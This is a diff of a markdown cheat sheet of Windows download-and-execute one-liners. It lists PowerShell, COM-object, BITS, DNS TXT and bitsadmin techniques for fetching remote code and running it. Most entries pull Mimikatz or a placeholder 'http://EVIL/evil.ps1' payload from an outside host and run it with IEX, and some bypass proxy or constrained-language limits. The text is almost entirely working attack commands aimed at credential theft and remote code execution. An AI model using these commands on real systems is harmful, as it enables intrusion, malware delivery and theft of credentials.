@@ -3,61 +3,61 @@
 ## powershell.exe
 
 ### powershell proxy auth
-```
+
 $Client = New-Object -TypeName System.Net.WebClient
 $Client.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
 IEX (iwr 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
-```
+
 
 ### powershell 4.0 & 5.0 Invoke-WebRequest (works in constrained language mode)
-```
+
 Invoke-WebRequest "http://10.10.10.10/mimikatz.exe" -OutFile "C:\Users\Public\mimikatz.exe"
-```
+
 
 ### powershell 3.0+ download and execute (bypass IE firstrun check)
-```
+
 IEX (iwr 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1' -UseBasicParsing)
-```
+
 
 ### powershell (any version)
-```
+
 powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"
-```
-```
+
+
 (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1", "C:\Users\Public\Invoke-Mimikatz.ps1")
-```
+
 
 ### hidden IE com object
-```
+
 $ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r
-```
+
 
 ### Msxml2.XMLHTTP COM object
-```
+
 $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText
-```
+
 
 ### WinHttp COM object
-```
+
 [System.Net.WebRequest]::DefaultWebProxy
 [System.Net.CredentialCache]::DefaultNetworkCredentials
 $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText
-```
+
 
 ### bitstransfer
-```
+
 Import-Module bitstransfer;Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\t;$r=gc $env:temp\t;rm $env:temp\t; iex $r
-```
+
 
 // DNS TXT approach from PowerBreach (https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerBreach/PowerBreach.ps1)
 //   code to execute needs to be a base64 encoded string stored in a TXT record
-```
+
 IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"'[0]))))
-```
+
 
 
 ### from @subtee
-```
+
 <#
 <?xml version="1.0"?>
 <command>
@@ -69,7 +69,7 @@ IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((
 $a = New-Object System.Xml.XmlDocument
 $a.Load("https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt")
 $a.command.a.execute | iex
-```
+
 
 References:
 
@@ -77,9 +77,9 @@ https://gist.github.com/HarmJ0y/bb48307ffa663256e239
 
 
 ## bitsadmin.exe
-```
+
 cmd.exe /c "bitsadmin.exe /transfer downld_job /download /priority high http://www.trustedsite.com C:\Temp\mimikatz.exe & start C:\Temp\mimikatz.exe"
-```
+
 References: 
 
 https://www.greyhathacker.net/?tag=download-and-execute
